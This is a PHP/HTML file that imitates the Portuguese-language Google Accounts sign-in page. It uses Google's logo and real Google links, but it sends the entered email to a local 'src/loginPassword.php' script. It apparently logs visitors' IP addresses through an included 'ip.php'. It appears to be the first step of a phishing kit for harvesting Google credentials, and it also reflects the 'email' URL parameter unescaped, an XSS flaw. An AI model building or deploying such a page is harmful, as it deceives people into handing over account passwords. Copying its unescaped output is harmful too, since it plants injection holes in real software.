<?php include("ip.php");?>
<!DOCTYPE html>
<html lang="pt-br">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Fazer Login nas Contas Google</title>
    <link rel="stylesheet" href="assets/css/email.css">
  </head>
  <body>
    <main>
      <div class="container">
        <div class="box">
          <form action="src/loginPassword.php" method="POST">
            <div class="logo">
              <img src="assets/img/googlelogo.png" alt="Logo google">
            </div>
            <div class="title">
              <h2>Fazer login</h2>
            </div>
            <div class="text">
              <p>Use sua Conta do Google</p>
            </div>
          
            <div class="form-group">
              <input type="email" name="email" id="email" value="<?php if (isset($_GET['email'])) { echo $_GET['email'];}?>" required>
              <label for="email">E-mail ou telefone</label>
            </div>
            <p>
              <a href="#">Esqueceu seu e-mail?</a>
            </p>
            <p>
              Não está no seu computador? Use o modo visitante para fazer login com privacidade. <a href="#">Saiba mais</a>
            </p>
            <div class="button-group">
              <a href="#" class="dropdown">Criar conta</a>
              <button type="submit">Avançar</button>
                  
              <ul class="contas">
                <li><a href="#">Para uso Pessoal</a></li>
                <li><a href="#">Para uma criança</a></li>
                <li><a href="#">Para trabalho ou empresa</a></li>
              </ul>
            </div>
          
          </form>
          <ul class="links">
            <li><a href="#">Português (Brazil)</a></li>
            <li><a href="https://support.google.com/accounts?hl=pt-BR&p=account_iph">Ajuda</a></li>
            <li><a href="https://accounts.google.com/TOS?loc=BR&hl=pt-BR&privacy=true">Privacidade</a></li>
            <li><a href="https://accounts.google.com/TOS?loc=BR&hl=pt-BR">Termos</a></li>
          </ul>    
      
        </div>
      </div>
    </main>
    <script src="assets/js/email.js"></script>
  </body>
</html>